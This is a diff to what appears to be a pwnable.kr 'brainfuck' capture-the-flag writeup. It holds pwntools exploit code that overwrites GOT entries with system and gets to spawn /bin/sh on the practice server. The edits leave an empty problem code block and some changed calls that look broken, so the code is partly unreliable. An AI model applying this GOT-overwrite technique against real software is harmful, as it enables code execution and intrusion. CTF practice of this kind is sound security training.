@@ -1,3 +1,14 @@
+# Pwnable.kr brainfuck CTF Writeup
+
+## Problem Description  
+
+```c
+
+```
+
+
+## Analysis  
+
 ```python
 from pwn import *
 
@@ -20,6 +31,7 @@ p.interactive()
 session.close()
 ```
 
+## Exploit Code
 ```python
 from pwn import *
 
@@ -29,8 +41,8 @@ session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
 p = session.process('./brainfuck')
 
 # Local files for finding offsets (which do not affected by ASLR)
-e = ELF(r'c:\Users\dalal\Desktop\Private_Projects\CTF\pwnable.kr\brainfuck\brainfuck')
-libc = ELF(r'c:\Users\dalal\Desktop\Private_Projects\CTF\pwnable.kr\brainfuck\libc-2.23.so')
+e = ELF(r'/mnt/c/users/dalal/desktop/private_projects/ctf/pwnable.kr/brainfuck/brainfuck')
+libc = ELF(r'/usr/lib32/libc.so.6')
 
 fgets_got = e.got['fgets']
 memset_got = e.got['memset']
@@ -40,7 +52,7 @@ putchar_got = e.got['putchar']
 fgets_offset = libc.symbols['fgets']
 gets_offset = libc.symbols['gets']
 system_offset = libc.symbols['system']
-main_addr = e.symbols['main'] # does not affected by ASLR
+main_addr = 0x08048700 # does not affected by ASLR
 
 tape_addr = 0x804a0a0
 
@@ -89,18 +101,7 @@ payload = p32(system_addr) + p32(gets_addr) + p32(main_addr)
 p.send(payload)
 sleep(0.3)
 
-p.sendlineafter(b"type some brainfuck instructions except [ ]\n", b"/bin/sh\0") # Send "/bin/sh" to trigger system("/bin/sh")
-sleep(0.3)
+p.send(b"/bin/sh") # Send "/bin/sh" to trigger system("/bin/sh")
 
-p.interactive()
-session.close()
-
-```
-
-```
-[*] fgets_addr : 0xf7dde6c0
-[*] libc base  : 0xf7d80560
-[*] system_addr: 0xf7dbb310
-[*] gets_addr  : 0xf7ddf950
-[*] main_addr  : 0x8048671
+session.interactive()
 ```
